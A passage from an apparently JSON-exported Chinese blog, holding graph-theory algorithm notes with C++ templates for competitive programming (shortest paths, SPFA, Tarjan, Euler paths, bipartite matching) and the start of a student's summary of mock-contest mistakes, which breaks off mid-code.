$dis1[u]+w<dis1[v]$ 则 $dis1[v]=dis1[u]+w$\n\n如果 $dis1[v]<dis1[u]+w$ （注意不能取等，否则最短路和次短路长度可能相同） 但 $dis1[u]+w<dis2[v]$ 则 $dis2[v]=dis1[u]+w$\n\n如果 $dis2[u]+w<dis2[v]$ 则 $dis2[v]=dis2[u]+w$（值得注意的是，如果条件二触发了，则条件三一定不会触发）\n\n上述三个条件任意一个触发，都让v入队。在优先队列中，按 $dis1[]$ 作为关键字进行比较\n\n```cpp\nbool flag=false;\nif(dis1[now]+w<dis1[to]){\n\tdis1[to]=dis1[now]+w;\n\tflag=true;\n}\nif(dis1[now]+w>dis1[to]&&dis1[now]+w<dis2[to]){\n\tdis2[to]=dis1[now]+w;\n\tflag=true;\n}\nif(dis2[now]+w<dis2[to]){\n\tdis2[to]=dis2[now]+w;\n\tflag=true;\n}\nif(flag){\n\tq.push(pii(dis1[to],to));\n}\n```\n\n注意与树形dp求树的直径做区分，次短路是严格小于的，因此不能取等，而树的直径的dis2是可以和dis1相等的\n\n### 最短路图\n\n在图上，从s到任意一点的路径长度都为这个点的最短路。对于不同的源点可以求出不同的最短路图。\n\n#### 无向图\n\n无向图最短路图为最短路树。\n\n事实上，我们仍然可以对无向图求最短路图。只需要枚举每个点，然后遍历当前点所有的边，检查边是否满足$dis[u]+w=dis[v]$。**再保证每个点只有一个入度**即可。这样求出的最短路树和字典序有关。\n\n最短路树可能有多个，一般我们只需要获得任意一个用来研究。\n\n我们可以通过记录某个节点和其父节点是由哪个边连起来的，这样来求最短路树\n\n```cpp\n            if(dis[now]+w<dis[to]){\n\t\t\t\tdis[to]=dis[now]+w;\n\t\t\t\tpre[to]=i;\n\t\t\t\tq.push(pii(dis[to],to));\n\t\t\t}\n```\n\n#### 有向图\n\n有向图最短路图是一个DAG。\n首先使用dijkstra算法求出$dis[]$，然后遍历每一条边。对于一条边$(u,v,w)$，如果满足$dis[u]+w=dis[v]$，那么这条边在最短路图上。\n\ndijkstra部分略\n\n```cpp\nint is[3003];\nint in[3003];\nfor(int i=1;i<=m;i++){\n\tint u=edge[i].from;\n\tint v=edge[i].to;\n\tint w=edge[i].w;\n\tif(dis[u]+w==dis[v]){\n\t\tis[i]=true;\n      \t\tin[v]++;\n\t}\n}\n```\n\n使用$is[]$，就可以无需重新建图实现在图上拓扑排序，只需枚举到一个边时判断其is值，如果为false则忽略即可。\n\n一个应用\n\n**在DAG上求边数经过次数**\n\n利用最短路图，可以实现在DAG上求有多少个最短路经过了这个边\n\n注意：如果没有说明源点，那么你需要做多次下面的算法\n\n需要两次拓扑排序：\n\n第一次求**从源点**有多少条路径经过一个点。初始化$cnt1[s]=1$，然后拓扑排序，对于边$(u,v)$，有转移方程$cnt1[v]+=cnt1[u]$\n\n第二次求从一个点出去会经过多少点。需要对最短路图建反图。在反图上，初始化$cnt2[任意点]=1$。对于边$(u,v)$，有转移方程$cnt2[v]+=cnt2[u]$。\n\n然后对于最短路图上的每一个边$(u,v)$，$cnt1[u]*cnt2[v]$即为这个边被最短路经过的次数\n\n#### 定向最短路图\n\n对于源点s和另一点t，和一条边$(u,v,w)$，如果满足$dis_s[u]+w+dis_t[v]=dis_s[t]$ 那么这条边就在从s到t的最短路上。其中 $dis_x[]$ 表示以x为源点的最短路\n\n### 同余最短路\n\n**[国家集训队] 墨墨的等式**\n\n墨墨突然对等式很感兴趣，他正在研究 $\\sum_{i=1}^n a_ix_i=b$ 存在非负整数解的条件，他要求你编写一个程序，给定 $n, a_{1\\dots n}, l, r$，求出有多少 $b\\in[l,r]$ 可以使等式存在非负整数解。\n\n首先一个特判，如果 $a_i$ 为 0，那么他应该被忽略掉\n\n然后我们选择 $a_i$ 中最小的那个数作为 base。\n\n然后再一个特判，base=1时，l 到 r 都可以作为一个解，直接输出 (r-l+1)\n\n先考虑 $[1,r]$ 中能满足等式的数，最后差分即可得出 $[l,r]$ 的答案。\n\n接下来就是同余最短路了。\n\n考虑将 $[1,r]$ 中所有的数字按%base的余数分成base个类。然后对于每一同余类，我们用同余最短路求出若干个 $a_i$ 之间相互来回加能加出的**最小的**，%base等于一个值的数。\n\n求出最小的这个数有什么用？比如base=3，余数为1中最小能加出来的数为10，那么显然13也可以被拼出来，16也可以，19也可以...，我们可以通过不断调整base即可。\n\n那如果不仅调整base，还调整其他的 $a_i$ 呢？那样会使得余数不再为1了，就是另外一个同余类了。\n\n我们可以按照下面的方式建图\n\n```cpp\nfor(int i=0;i<base;i++)\n\tfor(int j=1;j<=n;j++)\n\t\tif(a[j]!=base) add(i,(i+a[j])%base,a[j]);\n```\n\ndijkstra时和普通的没啥区别\n\n然后对于一个同余类，余数为 $i$，$(r-dis[i])/base+1$ 即为能拼出来的数的个数，枚举 $i$ 把答案全部相加即可\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\n\nint base=0x3f3f3f3f,dis[500005],vis[500005],head[500005],a[20],n,l,r,size;\nstruct Edge{int next,to,w;} edge[10000007];\ninline void add(int u,int v,int w){edge[++size].to=v,edge[size].w=w,edge[size].next=head[u],head[u]=size;}\n\ntypedef pair<int,int> pii;\ninline void dijkstra(){\n\tmemset(dis,0x3f,sizeof dis);\n\tdis[0]=0;\n\tpriority_queue<pii,vector<pii>,greater<pii> > q;\n\tq.push(make_pair(0,0));\n\twhile(!q.empty()){\n\t\tint now=q.top().second;q.pop();\n\t\tif(vis[now]) continue;\n\t\tvis[now]=true;\n\t\tfor(int i=head[now];i;i=edge[i].next){\n\t\t\tint w=edge[i].w;\n\t\t\tint to=edge[i].to;\n\t\t\tif(dis[to]>dis[now]+w){\n\t\t\t\tdis[to]=dis[now]+w;\n\t\t\t\tif(!vis[to]) q.push(make_pair(dis[to],to));\n\t\t\t}\n\t\t}\n\t}\n}\n\nsigned main(){\n\tcin>>n>>l>>r;\n\tint nn=0;\n\tfor(int x,i=1;i<=n;i++){\n\t\tcin>>x;\n\t\tif(!x) continue;\n\t\ta[++nn]=x,base=min(base,a[nn]);\n\t}\n\tn=nn;\n\tif(base==1) return cout<<(r-l+1),0;\n\tfor(int i=0;i<base;i++)\n\t\tfor(int j=1;j<=n;j++)\n\t\t\tif(a[j]!=base) add(i,(i+a[j])%base,a[j]);\n\tdijkstra();\n\tint ansr=0,ansl=0;\n\tfor(int i=0;i<base;i++){\n\t\tif(r<dis[i]) continue;\n\t\tansr+=(r-dis[i])/base+1;\n\t}\n\tl--;\n\tfor(int i=0;i<base;i++){\n\t\tif(l<dis[i]) continue;\n\t\tansl+=(l-dis[i])/base+1;\n\t}\n\t//for(int i=0;i<base;i++) cout<<dis[i]<<' ';\n\tcout<<ansr-ansl;\n\treturn 0;\n}\n```\n\n### 有向图最小环\n\n首先枚举起点 $s=1...n$。使用dijkstra算法，则s一定是第一个出堆的节点。对s的连边进行松弛操作，松弛后令 $dis[s]$ 为正无穷，然后继续进行。当s第二次从堆中取出时，$dis[s]$ 即为最小环长度\n\n## spfa算法\n\n只要使用spfa算法，无论是最短路还是负环，都有被卡的风险。最短路如果没有负边权一定要选择dijkstra算法。判断负环建议使用拓扑排序\n\n### 最短路\n\nspfa适用于存在负边权的图求单源最短路\n\n和dijkstra不同，$vis[]$ 表示点是否在队列中。当一个点的距离被松弛时，把这个点加入队列中\n\n```cpp\nint dis[100005];\nint vis[100005];\nvoid spfa(int x){\n\tmemset(dis,0x3f,sizeof(dis));\n\tqueue<int> q;\n\tdis[x]=0;\n\tq.push(x);\n\twhile(!q.empty()){\n\t\tint now=q.front();q.pop();\n\t\tvis[now]=false;\n\t\tfor(int i=head[now];i;i=edge[i].next){\n\t\t\tint to=edge[i].to;\n\t\t\tint w=edge[i].w;\n\t\t\tif(dis[to]>dis[now]+w){\n\t\t\t\tdis[to]=dis[now]+w;\n\t\t\t\tif(!vis[to]){\n\t\t\t\t\tvis[to]=true;\n\t\t\t\t\tq.push(to);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n### 判断负环\n\n只需要记录每个点入队次数（起点不算）。在松弛后，如果入队了，就$cnt[to]++$，然后立刻判断`if(cnt[to]>=n)`\n\n```cpp\n...\n\t\t\t\tif(!vis[to]){\n\t\t\t\t\tcnt[to]++;\n\t\t\t\t\tif(cnt[to]>=n){\n\t\t\t\t\t\treturn true;//存在负环\n\t\t\t\t\t}\n\t\t\t\t\tvis[to]=true;\n\t\t\t\t\tq.push(to);\n\t\t\t\t}\n...\n```\n\n## 差分约束\n\n### 限制上限\n\n标准式：$x_i-x_j\\le c$，等价于从$j$向$i$连接一条边权为$c$的有向边  \n按照上面建图，然后再添加一个超级源点\n\n```cpp\nfor(int i=1;i<=n;i++){\n\tadd(n+1,i,0);\n}\n```\n\n这里的0就是限制的上限！最后求出的结果不会大于0，小于等于0  \n使用spfa跑最短路（以超级源点为起点），顺便判断负环\n\n注意：判断负环的时候要和n+1比较，因为引入了超级源点\n\n```cpp\nif(cnt[to]>=n+1) return true;\n```\n\n存在负环说明无解，有解的话，$dis[]$就是一组解\n\n限制上限后，所有的解都会尽量向上限靠近，所以也可以视为求的是最大解\n\n**最大解，限制上限，小于号，跑最短路**\n\n### 限制下限\n\n标准式：$x_i-x_j\\\\ge  c$，等价于从$j$向$i$连接一条边权为$c$的有向边\n\n剩下的同上。如果是`add(n+1,i,1);`，则说明最后求出的结果不会小于1，大于等于1\n\n限制下限后，所有的解都会尽量向下限靠近，所以也可以视为求得是最小解\n\n**最小解，限制下限，大于号，跑最长路**\n\n## tarjan算法\n\n### 染色\n\n```cpp\n//tarjan部分\nint _time=0;//time是关键字，要加下划线\nint dfn[10004],low[10004];\nstack<int> s;\nint lock[10004];\n//染色部分\nint tot=0;\nint id[10004];\nvoid dfs(int x);\nvoid tarjan(){\n\tfor(int i=1;i<=n;i++){\n\t\tif(!dfn[i]) dfs(i);\n\t}\n}\nvoid dfs(int x){\n\tdfn[x]=low[x]=++_time;\n\ts.push(x);\n\tlock[x]=true;\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(!dfn[to]){\n\t\t\tdfs(to);\n\t\t\tlow[x]=min(low[x],low[to]);\n\t\t}else if(lock[to]) low[x]=min(low[x],dfn[to]);\n\t}\n\tif(low[x]==dfn[x]){\n\t\ttot++;\n\t\twhile(true){\n\t\t\tint k=s.top();s.pop();\n\t\t\tlock[k]=false;\n\t\t\tid[k]=tot;\n\t\t\tif(k==x) break;\n\t\t}\n\t}\n}\n```\n\n### 缩点\n\n和染色类似。不同的是，缩点时，强连通分量的id不需要自己分配，可以直接选择一个点的编号来代表。这为之后重建图提供便利\n\n```cpp\n...\n\tif(dfn[x]==low[x]){\n\t\twhile(true){\n\t\t\tint k=s.top();s.pop();\n\t\t\tlock[k]=false;\n\t\t\tid[k]=x;//////\n\t\t\tif(k==x) break;\n\t\t\tw[x]+=w[k];//必要时，可以将点权也塞进缩到的点里面\n\t\t}\n\t}\n...\n```\n\n重建图\n\n重建图后就变成DAG了，往往需要用拓扑dp，参考dp部分\n\n```cpp\nvoid rebuild(){\n\tfor(int i=1;i<=m;i++){\n\t\tint x=id[edge[i].from],y=id[edge[i].to];\n\t\tif(x!=y){\n\t\t\tnadd(x,y);\n\t\t}\n\t}\n}\n```\n\n### 桥与边双连通分量\n\n#### 求解\n\n桥是在无向图中定义的\n\n**桥：将一个边删掉，整个图变得不连通了。这样的边称为桥**\n\n因为只需要考虑low和dfn的关系，所以不需要$lock[]$和$stack$\n\n求桥时可能会有重边，重边会影响到桥。解决办法就是第一次遍历到fa时continue掉，后面再遍历到的话，就当做普通的点一样，不continue\n\n```cpp\nvoid dfs(int x,int fa){\n\tdfn[x]=low[x]=++_time;\n\tbool flag=false;\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa&&!flag){\n\t\t\tflag=true;\n\t\t\tcontinue;\n\t\t}\n\t\tif(!dfn[to]){\n\t\t\tdfs(to,x);\n\t\t\tif(low[to]>dfn[x]){//如果目标不能回溯到当前节点，那么当前节点的目标节点之间必有桥\n\t\t\t\ttot++;\n\t\t\t\tans[tot].from=min(x,to);\n\t\t\t\tans[tot].to=max(x,to);\n\t\t\t}\n\t\t\tlow[x]=min(low[x],low[to]);\n\t\t}else low[x]=min(low[x],dfn[to]);\n\t}\n}\n```\n\n**边双连通分量：将所有的桥都去掉，剩下的连通块就是边双连通分量**\n\n注意由于是无向图，标记一个桥后实际上是要去掉两条边。不用真的去掉，打个标记，dfs的时候判断一下即可\n\n#### 性质\n\n- 边双连通分量中的任意两点之间都有至少两条不重复路径\n\n- 将边双缩成一个点，和桥一起就会构成一个树，设树中度数为1的节点有k个。则，一个有桥的连通图，通过加边变为边双，k=1至少要添加的边数为0，其他情况下至少添加边数为 $(k+1)/2$ （即尽可能叶子节点之间两两配对，2个至少一条边，3个至少两个，4个至少两个个...）\n\n### 割点与点双连通分量\n\n#### 求解\n\n割点是在无向图中定义的\n\n**割点：去掉一个点以及这个点所连的边之后，图不连通了，这个点称为割点**\n\n```cpp\nint _time=0;\nint dfn[20004],low[20004];\nbool cut[20004];//是否为割点\nvoid tarjan(int x,int fa){\n\tdfn[x]=low[x]=++_time;\n\tint child=0;//记录子树数目\n\tfor(int i=head[x];i;i=edges[i].next){\n\t\tint to=edges[i].to;\n\t\tif(to==fa) continue;\n\t\tif(!dfn[to]){\n\t\t\tchild++;\n\t\t\ttarjan(to,x);\n\t\t\tlow[x]=min(low[x],low[to]);\n\t\t\tif(low[to]>=dfn[x]){//最多只能回溯到当前点，更早的点回溯不了\n\t\t\t\tcut[x]=true;\n\t\t\t}\n\t\t}\n\t\telse low[x]=min(low[x],dfn[to]);\n\t}\n\tif(x==fa&&child>=2) cut[x]=true;//如果当前节点为根节点且根节点有两个子树，根节点为割点\n}\n```\n\n和求桥类似，`low[to]>=dfn[x]` 时 x 即为割点。注意还是要特判一种情况：为根节点且有两个或两个以上子树的点也为割点\n\n**点双连通分量：不存在割点的极大连通子图**\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220827220910.png)\n\n值得注意的是，单独的一个点也是点双连通分量\n\n```cpp\nint n,m;\nint _time=0;\nint dfn[500005],low[500005];\nint vis[500005];\nstack<int> s;\nint tot=0;\nvector<int> ans[500005];\nvoid dfs(int x,int fa){\n\tint son=0;\n\tdfn[x]=low[x]=++_time;\n\ts.push(x);\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa) continue;\n\t\tif(!dfn[to]){\n\t\t\tson++;\n\t\t\tdfs(to,x);\n\t\t\tlow[x]=min(low[x],low[to]);\n\t\t\tif(low[to]>=dfn[x]){\n\t\t\t\ttot++;\n\t\t\t\tint las=0;\n\t\t\t\twhile(true){\n\t\t\t\t\tint k=s.top();s.pop();\n\t\t\t\t\tans[tot].push_back(k);\n\t\t\t\t\tif(k==to) break;//弹到to\n\t\t\t\t}\n\t\t\t\tans[tot].push_back(x);//再附赠个割点\n\t\t\t}\n\t\t}else low[x]=min(low[x],dfn[to]);\n\t}\n\tif(fa==0&&son==0) ans[++tot].push_back(x);//特判孤立点\n\t//不需要像求割点一样判断son>=2\n}\n```\n\n注意这回特判的是孤立点\n\n**圆方树**\n\n- 原图中的点被称为**圆点**。\n\n- 求得原图中所有点双连通分量，对每一个点双都新建一个节点，这类点被称为**方点**。\n\n- 删去原图中所有边，令每一个**圆点**向包含该点的点双对应的**方点**连边。\n\n![](https://www.caiwen.work/wp-content/uploads/2022/10/f507fe5a69ff44fe94b35f9ded31d5e1.png)\n\n```cpp\nint n,m,tot,head[_],size,heada[_],sizea;\nstruct Edge{int next,to;} edge[_],edgea[_];\ninline void add(int u,int v){edge[++size].next=head[u],head[u]=size,edge[size].to=v;}\ninline void adda(int u,int v){edgea[++sizea].next=heada[u],heada[u]=sizea,edgea[sizea].to=v;}\n\nint dfn[_],low[_],timer=0;\nstack<int> s;\nvoid dfs(int x,int fa){\n\tdfn[x]=low[x]=++timer;\n\ts.push(x);\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(!dfn[to]){\n\t\t\tdfs(to,x);\n\t\t\tlow[x]=min(low[x],low[to]);\n\t\t\tif(low[to]>=dfn[x]){\n\t\t\t\ttot++;//扫到一个割点就开一个方点\n\t\t\t\tadda(x,tot);adda(tot,x);\n\t\t\t\twhile(true){\n\t\t\t\t\tint now=s.top();s.pop();\n\t\t\t\t\tadda(tot,now);adda(now,tot);\n\t\t\t\t\tif(now==to) break;\n\t\t\t\t}\n\t\t\t}\n\t\t}else if(to!=fa) low[x]=min(low[x],dfn[to]);\n\t}\n}\n\ntot=n;\ndfs(1,0);\n```\n\n注意圆方树空间开2倍，而且不需要特判孤立点了\n\n#### 性质\n\n- 除了只有两个点的点双，其他点双都满足：任意两点间都存在至少两条点不重复路径\n\n- 任意一个割点都至少存在两个点双中\n\n- 不是割点的点只存在于一个点双中\n\n## 欧拉路\n\n### 概念性质\n\n1. 欧拉回路：图中经过每条边，且只经过一次的回路\n\n2. 欧拉路径：图中经过每条边，且只经过一次的路径\n\n3. 欧拉图：存在欧拉回路的图\n\n4. 半欧拉图：只存在欧拉路径，但不存在欧拉回路的图\n\n有以下性质：\n\n对于无向图\n\n1. 无向图为欧拉图，当且仅当这个图为连通图，且所有顶点的度为偶数\n\n2. 无向图为半欧拉图，当且仅当这个图为连通图，且除了有两个顶点的度为奇数外，其他点的度都为偶数\n\n对于有向图\n\n1. 有向图为欧拉图，当且仅当这个图的基图连通，且所有顶点的入度等于出度\n\n2. 有向图为半欧拉图，当且仅当这个图的基图连通，且一个点的出度比入度大1，一个点的入度比出度大1，其他点的出度等于入度\n\n### 求欧拉路径\n\n#### 有向图\n\n首先是一堆判定存在的代码\n\n```cpp\n    int s=1;\n\tint cnt1=0,cnt2=0;\n\tfor(int i=1;i<=n;i++){\n\t\tif(in[i]!=out[i]) flag=false;\n\t\tif(out[i]-in[i]==1) cnt1++,s=i;\n\t\tif(in[i]-out[i]==1) cnt2++;\n\t}\n\tif((!flag)&&!(cnt1==cnt2&&cnt1==1)) return !(cout<<\"No\");\n```\n\n然后从起点，直接dfs走起\n\n$del[]$ 存一个点的遍历起点，这个再遍历回这个点之后就可以快速跳过已经遍历过的边\n\n```cpp\nvoid dfs(int x){\n\tfor(int i=del[x];i<g[x].size();i=del[x]){\n\t\tdel[x]++;\n\t\tdfs(g[x][i]);\n\t}\n\tans.push(x);\n}\n```\n\n注意保存答案的时候一定要使用回溯+栈来保存，不能在for循环内直接保存答案\n\n#### 无向图\n\n无向图如果类比有向图使用del数组+记录fa的话会出现各种奇怪错误。因此建议使用比较保守的邻接矩阵+ $O(mn)$ 算法\n\n还要注意使用栈，先dfs再记录答案\n\n```cpp\nstack<int> s;\nvoid dfs(int x){\n\tfor(auto to:ve[x]){\n\t\tif(ma[to][x]==maxx[to][x]) continue;//这里是用于处理重边，记录重边遍历了多少次，如果重边都走完了就不走了\n\t\tma[to][x]++,ma[x][to]++;\n\t\tdfs(to);\n\t}\n\ts.push(x);\n}\n```\n\n## 匈牙利算法\n\n```cpp\nvector<int> ve[101];\nint match[101],t[101];\nbool dfs(int x,int tag){\n\tif(t[x]==tag) return false;\n\tt[x]=tag;\n\tfor(int to:ve[x]) if(!match[to]||dfs(match[to],tag)) return match[to]=x,true;\n\treturn false;\n}\n```\n\n","summary":"noip提高级范围内的图论算法知识点和模板，自用。","key":["noip","模板","图论"],"tags":[{"value":"自用","color":"primary"}],"path":["算法竞赛","板子","noip","图论.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/10/QQ截图20221122214601.png","recommend":false,"status":"published"},{"type":"Article","title":"csp前模拟赛错误总结","id":"mo_ni_sai","createTime":"2022-09-30T03:51:00.000Z","updateTime":"2025-09-05T13:34:06.226Z","content":"\n## 9-5测试\n\nt1：ac\n\nt2：ac\n\nt3：后缀数组，不会\n\nt4：暴力也要尽可能优化。多过一个点也能超过很多人\n\n## 9-7测试\n\nt1：要注意，使用滚动数组后，最后要注意调用最后的滚动数组需要`arr[now]`，而不是`arr[1-now]`\n\nt2：ac\n\nt3：网络流，不会\n\n## 51nod第一场\n\nt1：交代码的时候要最后测试一下，确保调试输出都删除干净了\n\nt2：状压dp由于$n*2^n$的极限复杂度，在枚举状态的大循环里面要避免大常数操作。比如可以预处理的数据要预处理，尽量不要通篇longlong\n\n**t3：错误的算法却ac，未修改**\n\nt4：树上使用并查集\n\n## 51nod第二场\n\nt1：和上面不同，如果时间复杂度足够，一定要开longlong！\n\nt2：树上倍增\n\n**t3：好像是一种经典的树上dp，zhx讲过类似的。未修改**\n\n**t4：莫队+根号分治，未修改**\n\n## 19清北学堂模拟-1\n\nt0：一定要再三确定快读没有打错，不然全爆零！！！！注意时间分配，优先拿到暴力分，暴力打的好分数也不少了\n\nt1：ac\n\nt2：要注意留出时间认真审题（最后草草审题写暴力大概率爆零）。即使有正解，对于暴力分也要尽量打暴力，确保暴力分是稳拿的。或者造符合暴力测试点的测试数据，确保正解可以通过具有特殊性质的测试点\n\nt3：题解没看懂，不改了\n\n## 19清北学堂模拟-2\n\nt0：再次体现了上面所说的策略，三道题都没有想到正解。\n\nt1使用noip2012年的题目的一个结论进行玄学优化，暴力期望20pts，但另外20pts的暴力通过玄学优化也得到了（一开始其实是30pts，如果按照上面的策略，暴力越暴力越好，确保暴力分稳拿的话，就是40pts）；\n\nt2如果打表过程的时间占用不大，但是数据大的话，可以将打表程序合在主程序里，相当于预处理到数组中；\n\nt3即使是暴力分的测试点也要看好数据范围。换句话说，即使选择拿暴力分，数组范围也要尽量按正解的数据范围开\n\n## 51nod第三场\n\nt1: ac。dp时，如果一个下标可以通过另一个下标推导过来，那么这个下标可以被消掉，达到优化空间的效果。考虑进一步优化时，可以考虑滚动数组。使用滚动数组可以将dp的一维提出来，在最外层循环，但记录的时候只记录当前和上一个。这样虽然时间复杂度没变，但空间复杂度大大降低。\n\nt2：ac。如果题目数据比较容易生成，暴力容易写，那么最好使用对拍。对拍没出现错误则大概率ac。\n\nt3：构造题，太难了，看题解证明了几个小时才把题目完全理解明白。值得学习的是，由于犯懒，对于$n>=1000$的数据直接选择输出无解。实际上仍然需要拼一把，使用dfs继续暴力，据说dfs写得好可以80pts。  \n另外还有一种大根堆和小根堆的写法\n\n```cpp\nclass maxx{\n\tpublic:\n\t\tinline bool operator()(int x,int y){\n\t\t\treturn d[x]<d[y];\n\t\t}\n};\nclass minn{\n\tpublic:\n\t\tinline bool operator()(int x,int y){\n\t\t\treturn d[x]>d[y];\n\t\t}\n};\npriority_queue<int,vector<int>,minn> qmin;\npriority_queue<int,vector<int>,maxx> qmax;\n```\n\n（qmax大根堆，qmin小根堆，大根堆重载用小于号，小根堆重载用大于号）\n\nt4：涉及到线段树上构成区间的点在一条链上。如果是区间$[l,r]$，那么这条链就是$(l-1,r+1)$。除此之外，还需要特判 $l=1$ 且 $r=n$时 ，$l=1$和$r=n$。在对链进行维护时，使用树链剖分，注意从轻链跳到重链的时候要暴力修改，注意跳过一个链条时要去掉一头，在一个链条上时要去掉两头。由于每个链条的端点都需要建立线段树，所以线段树数量很多，因此开线段树时，sum和lazy数组要用vector，根据链条的长度来调节线段树的大小。\n\n## 清北学堂Day3\n\nt1:之前在51nod上做过，ac\n\nt2:一开始想到了一个一个大根堆一个小根堆的做法。中间是用对拍，成功发现了代码存在错误，修改后对拍了几千数据没有发现错误，再次体现了对拍的重要性。但是被卡了，70pts，tle。看题解才知道是一个线段树上二分的题目。\n\n使用离散化+二次离散化（即先把大数离散化为小数，然后相同的数之间再离散化成不同的数，相当于每个数都对应一个独一无二的id，相同的数之间的id不同。但是如果$a_i<a_j$则必有$id_i<id_j$）\n\n二次离散化之后，根据id建立一个类似于值域线段树。这样以来，我们可以利用线段树上的各种特性，如区间求和。其次，在插入和删除一个数之后，这些数在线段树上其实还是排序过的，这就无形之间排序了\n\n一开始看到线段树二分，就想了一个$nlognlogn$的做法，但tle+wa了。实际上，线段树作为一个完全二叉树，本身就可以二分的，只需要$nlogn$\n\n值得一提的是，中间开了1e6个stl的queue，发现程序刚运行，还未输入数据的时候运行奇慢。而且运行过程中查看任务管理器发现mle，这提醒我们对拍生成大数据测试时要打开任务管理器确保不会mle。\n\n前几次写出来之后对拍，使用中等规模数据对拍，发现都可以通过，但提交之后只有30pts，还不如自己一开始写的。而使用小规模数据，或者特殊数据（比如序列只有1和2），不仅对拍速度快，快速得到hack数据，wa之后也能轻松分析数据，修改程序。\n\nt3:一开始想了个dijkstra的做法，但其实dijkstra算法要求无后效性，但是原题是有后效性的。但感觉这个算法应该可以骗到一定的分数，就对规模较大的数据应用了这个错误算法。为了保险，在dijkstra算出一个答案之后，选择使用dfs进行优化答案。但是dfs会超时，就加入卡时的技巧。最后骗到70pts（貌似dfs优化答案+卡时并没有发挥效果）\n\n看题解后了解到，对于最小化两个$\\sum$相乘这种类型，可以将每个决策点看做二维平面上的一个点。先根据$w_a$，求出一个最短路（一个决策点A），再根据$w_b$，求出一个决策点B，则更优的决策点一定在这两个点连线的下方。使用向量叉乘，得到和两个点围成面积最大的另一个点C，然后再$solve(A,C)，solve(C,B)$进行分治。\n\nt4:遇到了和之前类似的，有关字典序的问题，但依然不会。草草写了个暴力，10pts。\n\n对于之前那道题，我们实际上是求某个状态下，第i位增加1，对整个序列的排名产生的贡献，既是求第i+1位到最后一位，在某个状态下有多少种情况。而求这个贡献，我们是使用组合数学的方法\n\n对于这道题，我们很难用数学方法直接算出来。我们考虑dp。其中，位置i之前在s序列中选择了多少个数，对于位置i+1到n的情况数存在影响，我们将其作为dp的一维。注意，在dp的时候，由于我们考虑的是位置i+1到n，因此需要倒序dp\n\n对于这两道题，得到每一位对排名的贡献之后，就可以按位枚举，得到需要的序列\n\n对于之前那道题，我们是直接生成为某个排名的序列，我们从第一位开始枚举\n\n对于这道题，我们要求比某个序列排名大指定排名的序列。我们在原始序列的基础上，倒着枚举。\n\n### T2：二次离散化+线段树二分\n\n```cpp\n#include<iostream>\n#include<cstdio>\n#include<cstring>\n#include<algorithm>\n#include<queue>\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\nusing namespace std;\n\nint sum1,cnt1,sum2,cnt2;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nint in[1000006],uni[1000006],tot;\nint n;\nint id[1000006];\nint pre[1000006];\nint to_uni[1000006];\nvector<int> tmp;\nstruct Entry{\n\tint index,value,id,opt;\n} fin[1000006];\n\nint sum[1000006<<4];\nint w[1000006<<4];\nvoid update(int k,int l,int r,int x,int d){\n\tif(l==r){\n\t\tsum[k]+=to_uni[l]*d;\n\t\tw[k]+=d;\n\t\treturn;\n\t}\n\tint mid=(l+r)>>1;\n\tif(x<=mid){\n\t\tupdate(ls(k),l,mid,x,d);\n\t}else{\n\t\tupdate(rs(k),mid+1,r,x,d);\n\t}\n\tsum[k]=sum[ls(k)]+sum[rs(k)];\n\tw[k]=w[ls(k)]+w[rs(k)];\n}\n\n//线段树二分\nint tota=0;\nvoid collect1(int k,int l,int r){\n\tif(l==r){\n\t\tif(sum[k]&&((sum1+sum[k])<<1)<=tota) cnt1++,sum1+=sum[k];\n\t\treturn;\n\t}\n\tint mid=(l+r)>>1;\n\tif(((sum1+sum[ls(k)])<<1)<=tota){\n\t\tcnt1+=w[ls(k)];\n\t\tsum1+=sum[ls(k)];\n\t\tcollect1(rs(k),mid+1,r);\n\t}else{\n\t\tcollect1(ls(k),l,mid);\n\t}\n}\nvoid collect2(int k,int l,int r){\n\tif(l==r){\n\t\tif(sum[k]&&((sum2+sum[k])<<1)<=tota) cnt2++,sum2+=sum[k];\n\t\treturn;\n\t}\n\tint mid=(l+r)>>1;\n\tif(((sum2+sum[rs(k)])<<1)<=tota){\n\t\tcnt2+=w[rs(k)];\n\t\tsum2+=sum[rs(k)];\n\t\tcollect2(ls(k),l,mid);\n\t}else{\n\t\tcollect2(rs(k),mid+1,r);\n\t}\n}\n\nbool cmp1(Entry a,Entry b){\n\tif(a.value==b.value) return a.index<b.index;\n\treturn a.value<b.value;\n}\nbool cmp2(Entry a,Entry b){\n\treturn a.index<b.index;\n}\n\nint now=0;\nsigned main(){\n\t//cout<<sizeof(id)/1024/1024<<endl;\n\t//第一次离散化\n\tn=read();\n\tfor(int i=1;i<=n;i++){\n\t\tin[i]=read();\n\t\tif(in[i]>0){\n\t\t\tuni[++tot]=in[i];\n\t\t}\n\t}\n\tsort(uni+1,uni+1+tot);\n\ttot=unique(uni+1,uni+1+tot)-uni-1;\n\tfor(int i=1;i<=n;i++){\n\t\tif(in[i]>0){\n\t\t\tin[i]=lower_bound(uni+1,uni+tot+1,in[i])-uni;\n\t\t}else{\n\t\t\tin[i]=lower_bound(uni+1,uni+tot+1,-in[i])-uni;\n\t\t\tin[i]=-in[i];\n\t\t}\n\t}\n\n\t//第二次离散化，先分好操作\n\tfor(int i=1;i<=n;i++){\n\t\tfin[i].index=i;\n\t\tif(in[i]>0){\n\t\t\tfin[i].value=in[i];\n\t\t\tfin[i].opt=1;\n\t\t}else{\n\t\t\tfin[i].value=-in[i];\n\t\t\tfin[i].opt=2;\n\t\t}\n\t}\n\t//排序，分配id\n\tsort(fin+1,fin+n+1,cmp1);\n\tfor(int 